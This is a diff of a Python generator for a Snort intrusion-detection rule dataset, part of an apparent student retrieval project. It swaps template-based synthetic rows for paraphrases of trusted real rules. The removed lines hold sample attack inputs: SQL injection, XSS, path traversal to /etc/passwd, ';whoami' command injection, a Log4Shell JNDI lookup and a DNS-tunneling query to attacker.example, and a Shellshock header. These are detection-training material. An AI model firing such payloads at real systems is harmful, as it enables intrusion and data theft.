@@ -1,180 +1,287 @@
-"""Generate the student-owned Snort dataset.
+"""Legacy experimental generator for trusted-rule expansion.
 
-The generated dataset is not a copied public ruleset. It is a structured,
-annotated, synthetic corpus derived from manually curated attack scenarios and
-legitimate Snort syntax/rule-source references.
+This module is kept only for older experiments that expanded a trusted Snort-rule
+knowledge base into large synthetic retrieval corpora. It is not part of the
+official Person 1 dataset workflow. The submitted project uses
+`data/processed/final_snort_dataset.csv` as the official personal dataset, and
+the application, notebook, runner, and validation flow must not depend on the
+`snort_generated_dataset.*` outputs produced here.
 """
 from __future__ import annotations
 
 import argparse
+import csv
+import itertools
 import json
 import random
 from pathlib import Path
-from typing import Dict, Iterable, List
+from typing import Dict, Iterable, Iterator, List
 
-import pandas as pd
-
+from snort_rag.knowledge_base import DEFAULT_KB_CSV, load_rule_kb
+from snort_rag.rule_parser import option_coverage, parse_rule, validate_rule
 from snort_rag.source_manifest import TRUSTED_SOURCES
-from snort_rag.templates import (
-    ATTACK_KEYWORDS,
-    CLASSTYPE,
-    DESCRIPTION_TEMPLATES,
-    SEVERITY,
-    detect_attack_type,
-    generate_snort_rule,
-    stable_sid,
-)
-from snort_rag.rule_parser import validate_rule, option_coverage
+from snort_rag.templates import SEVERITY
 
 PROJECT_ROOT = Path(__file__).resolve().parents[2]
+LEGACY_OUT_DIR = PROJECT_ROOT / "data" / "experiments" / "legacy_generated"
+LEGACY_SUMMARY_NAME = "snort_generated_dataset_summary.json"
 
 STYLE_PREFIXES = [
-    "Formal analyst request: ",
-    "SOC alert description: ",
-    "Short operator query: ",
-    "Student scenario: ",
-    "FR: ",
-    "Technical note: ",
+    "Formal analyst request:",
+    "SOC alert description:",
+    "Detection engineering note:",
+    "Blue-team scenario:",
+    "Security monitoring query:",
+    "Incident triage request:",
 ]
 
-TARGETS = [
-    "public web server", "internal DNS resolver", "Linux SSH bastion", "Windows RDP server",
-    "DMZ application", "FTP server", "SMB file server", "corporate proxy", "API endpoint",
+TARGET_HINTS = [
+    "internal web server",
+    "DNS resolver",
+    "mail gateway",
+    "domain controller",
+    "user workstation segment",
+    "DMZ application host",
+    "server VLAN",
 ]
 
-LOG_EXAMPLES = {
-    "port_scan": "SRC=203.0.113.10 DST=10.0.0.20 PROTO=TCP FLAGS=S PORTS=21,22,80,443,445 COUNT=34 WINDOW=60s",
-    "ssh_bruteforce": "SRC=198.51.100.23 DST=10.0.0.22 DPT=22 PROTO=TCP ATTEMPTS=12 WINDOW=60s",
-    "ftp_bruteforce": "SRC=198.51.100.44 DST=10.0.0.21 DPT=21 PAYLOAD='USER admin' REPEATED=8",
-    "rdp_bruteforce": "SRC=203.0.113.45 DST=10.0.0.39 DPT=3389 PROTO=TCP SYN_COUNT=18",
-    "sql_injection": "GET /product.php?id=1%20UNION%20SELECT%20user,password%20FROM%20users HTTP/1.1",
-    "xss": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
-    "directory_traversal": "GET /download?file=../../../../etc/passwd HTTP/1.1",
-    "command_injection": "GET /ping?host=127.0.0.1;whoami HTTP/1.1",
-    "log4shell": "User-Agent: ${jndi:ldap://attacker.example/a}",
-    "shellshock": "User-Agent: () { :;}; /bin/bash -c id",
-    "dns_tunneling": "DNS query: dGhpcy1pcy1hLXZlcnktbG9uZy1zdWJkb21haW4.attacker.example",
-    "dns_axfr": "DNS QUERY TYPE=AXFR zone=corp.local from 203.0.113.77",
-    "icmp_sweep": "ICMP echo request from 203.0.113.90 to 10.0.0.1-10.0.0.30",
-    "malware_c2": "GET /gate.php?id=abc123&v=1 HTTP/1.1 User-Agent: Mozilla/4.0",
-    "smb_exploit": "TCP 445 payload starts with FF SMB and suspicious transaction bytes",
-    "suspicious_user_agent": "GET / HTTP/1.1 User-Agent: sqlmap/1.7",
-    "webshell_upload": "POST /upload HTTP/1.1 multipart filename=shell.php Content-Disposition: form-data",
-    "benign": "GET /health HTTP/1.1 from monitoring server, expected every 30 seconds",
-}
 
-SOURCE_BY_ATTACK = {
-    "port_scan": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "ssh_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "ftp_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "rdp_bruteforce": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "sql_injection": "Emerging Threats Open Rules",
-    "xss": "Emerging Threats Open Rules",
-    "directory_traversal": "Emerging Threats Open Rules",
-    "command_injection": "Emerging Threats Open Rules",
-    "log4shell": "Emerging Threats Open Rules",
-    "shellshock": "Emerging Threats Open Rules",
-    "dns_tunneling": "Emerging Threats Open Rules",
-    "dns_axfr": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "icmp_sweep": "Snort 3 Rule Writing Guide - Cisco Talos",
-    "malware_c2": "Emerging Threats Open Rules",
-    "smb_exploit": "Snort Rules and IDS Software Downloads",
-    "suspicious_user_agent": "Emerging Threats Open Rules",
-    "webshell_upload": "Emerging Threats Open Rules",
-    "benign": "Snort 3 Rule Writing Guide - Cisco Talos",
-}
-
-SOURCE_URL_BY_NAME = {s["name"]: s["url"] for s in TRUSTED_SOURCES}
+def _trusted_source_map() -> Dict[str, Dict[str, str]]:
+    return {source["name"]: source for source in TRUSTED_SOURCES}
 
 
-def generate_description(attack_type: str, idx: int) -> str:
-    base = random.choice(DESCRIPTION_TEMPLATES[attack_type])
-    target = random.choice(TARGETS)
-    style = random.choice(STYLE_PREFIXES)
-    keyword_hint = ", ".join(random.sample(ATTACK_KEYWORDS[attack_type], min(2, len(ATTACK_KEYWORDS[attack_type]))))
-    if attack_type == "benign":
-        return f"{style}{base} Target: {target}. This should be classified as benign and should not create an alert rule."
+def _source_manifest_fieldnames() -> List[str]:
+    fieldnames = set()
+    for source in TRUSTED_SOURCES:
+        fieldnames.update(source.keys())
+    return sorted(fieldnames)
+
+
+def _decode_keywords(raw: str) -> List[str]:
+    if not raw:
+        return []
+    try:
+        parsed = json.loads(raw)
+    except json.JSONDecodeError:
+        return []
+    return [str(item) for item in parsed if str(item).strip()]
+
+
+def _msg_without_local_tokens(msg: str) -> str:
+    return msg.replace("ET ", "").replace("GPL ", "").replace("COMMUNITY ", "").strip()
+
+
+def _severity_for(attack_type: str, classtype: str) -> str:
+    if attack_type in SEVERITY:
+        return SEVERITY[attack_type]
+    lower = classtype.lower()
+    if "trojan" in lower or "attempted-admin" in lower:
+        return "high"
+    if "web-application-attack" in lower:
+        return "high"
+    if "policy" in lower:
+        return "medium"
+    if "recon" in lower:
+        return "medium"
+    return "medium"
+
+
+def _log_example(parsed_rule, keywords: List[str]) -> str:
+    tokens = []
+    if parsed_rule.protocol:
+        tokens.append(f"PROTO={parsed_rule.protocol.upper()}")
+    if parsed_rule.src:
+        tokens.append(f"SRC={parsed_rule.src}")
+    if parsed_rule.dst:
+        tokens.append(f"DST={parsed_rule.dst}")
+    if parsed_rule.dst_port:
+        tokens.append(f"DPT={parsed_rule.dst_port}")
+    if keywords:
+        tokens.append("KEYWORDS=" + ",".join(keywords[:3]))
+    return " ".join(tokens)
+
+
+def _descriptions(rule_row: Dict[str, str], idx_seed: int, multiplier: int) -> List[str]:
+    parsed = parse_rule(rule_row["rule"])
+    msg = _msg_without_local_tokens(rule_row.get("msg", "") or "Snort alert")
+    keywords = _decode_keywords(rule_row.get("content_keywords", ""))
+    target = TARGET_HINTS[idx_seed % len(TARGET_HINTS)]
+    protocol = parsed.protocol.upper()
+    dst_port = parsed.dst_port
+    source_file = Path(rule_row.get("source_file", "")).name
+    classtype = rule_row.get("classtype", "")
+    keyword_text = ", ".join(keywords[:3]) if keywords else "rule-specific payload indicators"
     variants = [
-        f"{style}{base} Target: {target}. Include a Snort rule with low false positives.",
-        f"{style}{base} Observed log: {LOG_EXAMPLES[attack_type]}",
-        f"{style}{base} Keywords: {keyword_hint}. Need a valid alert rule.",
-        f"{style}{base} The rule must use msg, sid, rev and classtype.",
+        f"{STYLE_PREFIXES[0]} Detect traffic matching the real Snort rule '{msg}' against the {target}.",
+        f"{STYLE_PREFIXES[1]} Build an alert for {msg}. Protocol {protocol}, destination port {dst_port}, based on the trusted rule source {source_file}.",
+        f"{STYLE_PREFIXES[2]} We need a Snort signature equivalent to the real rule '{msg}' with classtype {classtype}.",
+        f"{STYLE_PREFIXES[3]} Suspicious activity resembles {msg}. Focus on payload markers such as {keyword_text}.",
+        f"{STYLE_PREFIXES[4]} Use the trusted-source rule semantics for {msg}. Keep the alert aligned with {protocol} traffic to {dst_port}.",
+        f"{STYLE_PREFIXES[5]} Investigate an event that should match the real rule '{msg}' from {source_file}.",
     ]
-    return variants[idx % len(variants)]
+    return [variants[i % len(variants)] for i in range(multiplier)]
 
 
-def build_rows(multiplier: int = 8, seed: int = 42) -> List[Dict[str, object]]:
+def iter_rows(multiplier: int = 6, seed: int = 42, kb_path: Path | str = DEFAULT_KB_CSV) -> Iterator[Dict[str, object]]:
     random.seed(seed)
-    rows: List[Dict[str, object]] = []
-    attacks = list(DESCRIPTION_TEMPLATES.keys())
+    kb_rows = load_rule_kb(kb_path)
+    if not kb_rows:
+        raise ValueError("Trusted rule knowledge base is empty. Fetch real sources first.")
+    trusted = _trusted_source_map()
     row_id = 1
-    for attack_type in attacks:
-        for i in range(multiplier):
-            description = generate_description(attack_type, i)
-            if attack_type == "benign":
-                rule = "NO_RULE_RECOMMENDED"
-                valid, errors = False, ["Benign traffic: no Snort alert rule should be generated."]
-            else:
-                sid = stable_sid(f"dataset:{attack_type}:{i}:{description}")
-                rule = generate_snort_rule(attack_type, description, sid=sid, rev=1 + (i % 3))
-                valid, errors = validate_rule(rule)
-            source_name = SOURCE_BY_ATTACK[attack_type]
+    for kb_index, kb_row in enumerate(kb_rows):
+        descriptions = _descriptions(kb_row, kb_index + seed, multiplier)
+        valid, errors = validate_rule(kb_row["rule"])
+        parsed = parse_rule(kb_row["rule"])
+        keywords = _decode_keywords(kb_row.get("content_keywords", ""))
+        source_meta = trusted.get(kb_row["source_name"], {})
+        for local_index, description in enumerate(descriptions, 1):
             row = {
-                "id": f"SNORT-RAG-{row_id:04d}",
+                "id": f"SNORT-RAG-{row_id:07d}",
+                "kb_id": kb_row["kb_id"],
                 "description_nl": description,
                 "normalized_description": description.lower(),
-                "label": "benign" if attack_type == "benign" else "malicious",
-                "attack_type": attack_type,
-                "attack_family": "benign" if attack_type == "benign" else CLASSTYPE.get(attack_type, "unknown"),
-                "severity": SEVERITY.get(attack_type, "medium"),
-                "rule": rule,
+                "label": "malicious",
+                "attack_type": kb_row.get("attack_type", ""),
+                "attack_family": kb_row.get("classtype", "") or kb_row.get("attack_type", ""),
+                "severity": _severity_for(kb_row.get("attack_type", ""), kb_row.get("classtype", "")),
+                "rule": kb_row["rule"],
+                "base_rule": kb_row["rule"],
                 "rule_valid_by_parser": valid,
                 "rule_validation_errors": " | ".join(errors),
-                "option_coverage": option_coverage(rule) if rule != "NO_RULE_RECOMMENDED" else 0.0,
-                "source_name": source_name,
-                "source_url": SOURCE_URL_BY_NAME.get(source_name, ""),
-                "source_usage": "student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",
-                "generation_method": "manual_seed_plus_template_variation",
-                "log_example": LOG_EXAMPLES[attack_type],
+                "option_coverage": option_coverage(kb_row["rule"]),
+                "source_name": kb_row["source_name"],
+                "source_url": kb_row["source_url"],
+                "source_archive": kb_row.get("archive_name", ""),
+                "source_file": kb_row.get("source_file", ""),
+                "source_license_note": source_meta.get("license_note", ""),
+                "source_usage": "generated from a persisted trusted-source real Snort rule",
+                "generation_method": "real_rule_paraphrase_expansion",
+                "log_example": _log_example(parsed, keywords),
+                "base_rule_sid": kb_row.get("sid", ""),
+                "base_rule_rev": kb_row.get("rev", ""),
+                "base_rule_msg": kb_row.get("msg", ""),
+                "content_keywords": json.dumps(keywords, ensure_ascii=False),
+                "augmentation_index": local_index,
             }
-            rows.append(row)
+            yield row
             row_id += 1
-    return rows
+
+
+def build_rows(multiplier: int = 6, seed: int = 42, kb_path: Path | str = DEFAULT_KB_CSV) -> List[Dict[str, object]]:
+    return list(iter_rows(multiplier=multiplier, seed=seed, kb_path=kb_path))
 
 
 def export_dataset(rows: List[Dict[str, object]], out_dir: Path) -> None:
     out_dir.mkdir(parents=True, exist_ok=True)
-    df = pd.DataFrame(rows)
-    df.to_csv(out_dir / "snort_generated_dataset.csv", index=False)
-    df.to_json(out_dir / "snort_generated_dataset.json", orient="records", indent=2, force_ascii=False)
-    with (out_dir / "snort_generated_dataset.jsonl").open("w", encoding="utf-8") as f:
+    fieldnames = list(rows[0].keys()) if rows else []
+    with (out_dir / "snort_generated_dataset.csv").open("w", newline="", encoding="utf-8") as handle:
+        writer = csv.DictWriter(handle, fieldnames=fieldnames)
+        writer.writeheader()
+        writer.writerows(rows)
+    (out_dir / "snort_generated_dataset.json").write_text(
+        json.dumps(rows, indent=2, ensure_ascii=False),
+        encoding="utf-8",
+    )
+    with (out_dir / "snort_generated_dataset.jsonl").open("w", encoding="utf-8") as handle:
         for row in rows:
-            f.write(json.dumps(row, ensure_ascii=False) + "\n")
+            handle.write(json.dumps(row, ensure_ascii=False) + "\n")
 
-    source_manifest = pd.DataFrame(TRUSTED_SOURCES)
+    source_manifest = TRUSTED_SOURCES
     raw_dir = PROJECT_ROOT / "data" / "raw"
     raw_dir.mkdir(parents=True, exist_ok=True)
-    source_manifest.to_csv(raw_dir / "trusted_sources_manifest.csv", index=False)
+    with (raw_dir / "trusted_sources_manifest.csv").open("w", newline="", encoding="utf-8") as handle:
+        writer = csv.DictWriter(handle, fieldnames=_source_manifest_fieldnames())
+        writer.writeheader()
+        writer.writerows(source_manifest)
 
+    attack_types = sorted({str(row["attack_type"]) for row in rows})
+    valid_rows = [row for row in rows if row["rule_valid_by_parser"]]
+    source_names = sorted({str(row["source_name"]) for row in rows})
     summary = {
         "rows": len(rows),
-        "malicious_rows": int((df["label"] == "malicious").sum()),
-        "benign_rows": int((df["label"] == "benign").sum()),
-        "attack_types": sorted(df["attack_type"].unique().tolist()),
-        "valid_rule_rate_excluding_benign": float(df[df["label"] == "malicious"]["rule_valid_by_parser"].mean()),
+        "trusted_rule_rows": len({str(row["kb_id"]) for row in rows}),
+        "rows_per_rule": len(rows) // max(1, len({str(row["kb_id"]) for row in rows})),
+        "attack_types": attack_types,
+        "valid_rule_rate": len(valid_rows) / max(1, len(rows)),
+        "sources": source_names,
     }
-    (out_dir / "dataset_summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
+    (out_dir / LEGACY_SUMMARY_NAME).write_text(json.dumps(summary, indent=2), encoding="utf-8")
+
+
+def export_dataset_streaming(multiplier: int, seed: int, kb_path: Path | str, out_dir: Path) -> Dict[str, object]:
+    out_dir.mkdir(parents=True, exist_ok=True)
+    rows_iter = iter_rows(multiplier=multiplier, seed=seed, kb_path=kb_path)
+    first_row = next(rows_iter, None)
+    if first_row is None:
+        raise ValueError("No rows generated from the trusted rule knowledge base.")
+
+    csv_path = out_dir / "snort_generated_dataset.csv"
+    json_path = out_dir / "snort_generated_dataset.json"
+    jsonl_path = out_dir / "snort_generated_dataset.jsonl"
+    fieldnames = list(first_row.keys())
+    source_names = set()
+    attack_types = set()
+    kb_ids = set()
+    row_count = 0
+    valid_count = 0
+
+    def update_summary(row: Dict[str, object]) -> None:
+        nonlocal row_count, valid_count
+        row_count += 1
+        if row["rule_valid_by_parser"]:
+            valid_count += 1
+        source_names.add(str(row["source_name"]))
+        attack_types.add(str(row["attack_type"]))
+        kb_ids.add(str(row["kb_id"]))
+
+    with csv_path.open("w", newline="", encoding="utf-8") as csv_handle, \
+            json_path.open("w", encoding="utf-8") as json_handle, \
+            jsonl_path.open("w", encoding="utf-8") as jsonl_handle:
+        writer = csv.DictWriter(csv_handle, fieldnames=fieldnames)
+        writer.writeheader()
+        json_handle.write("[\n")
+        for index, row in enumerate(itertools.chain([first_row], rows_iter)):
+            writer.writerow(row)
+            jsonl_handle.write(json.dumps(row, ensure_ascii=False) + "\n")
+            json_handle.write(("  " if index == 0 else ",\n  ") + json.dumps(row, ensure_ascii=False))
+            update_summary(row)
+        json_handle.write("\n]\n")
+
+    source_manifest = TRUSTED_SOURCES
+    raw_dir = PROJECT_ROOT / "data" / "raw"
+    raw_dir.mkdir(parents=True, exist_ok=True)
+    with (raw_dir / "trusted_sources_manifest.csv").open("w", newline="", encoding="utf-8") as handle:
+        writer = csv.DictWriter(handle, fieldnames=_source_manifest_fieldnames())
+        writer.writeheader()
+        writer.writerows(source_manifest)
+
+    summary = {
+        "rows": row_count,
+        "trusted_rule_rows": len(kb_ids),
+        "rows_per_rule": row_count // max(1, len(kb_ids)),
+        "attack_types": sorted(attack_types),
+        "valid_rule_rate": valid_count / max(1, row_count),
+        "sources": sorted(source_names),
+    }
+    (out_dir / LEGACY_SUMMARY_NAME).write_text(json.dumps(summary, indent=2), encoding="utf-8")
+    return summary
 
 
 def main() -> None:
     parser = argparse.ArgumentParser()
-    parser.add_argument("--multiplier", type=int, default=10, help="Rows per attack type.")
+    parser.add_argument("--multiplier", type=int, default=6, help="Rows to generate per trusted base rule.")
     parser.add_argument("--seed", type=int, default=42)
-    parser.add_argument("--out", type=Path, default=PROJECT_ROOT / "data" / "processed")
+    parser.add_argument("--kb", type=Path, default=DEFAULT_KB_CSV, help="Trusted rule knowledge-base CSV path.")
+    parser.add_argument("--out", type=Path, default=LEGACY_OUT_DIR)
     args = parser.parse_args()
-    rows = build_rows(multiplier=args.multiplier, seed=args.seed)
-    export_dataset(rows, args.out)
-    print(f"Generated {len(rows)} rows in {args.out}")
+    summary = export_dataset_streaming(
+        multiplier=args.multiplier,
+        seed=args.seed,
+        kb_path=args.kb,
+        out_dir=args.out,
+    )
+    print(f"Generated {summary['rows']} rows in {args.out} from {args.kb}")
 
 
 if __name__ == "__main__":
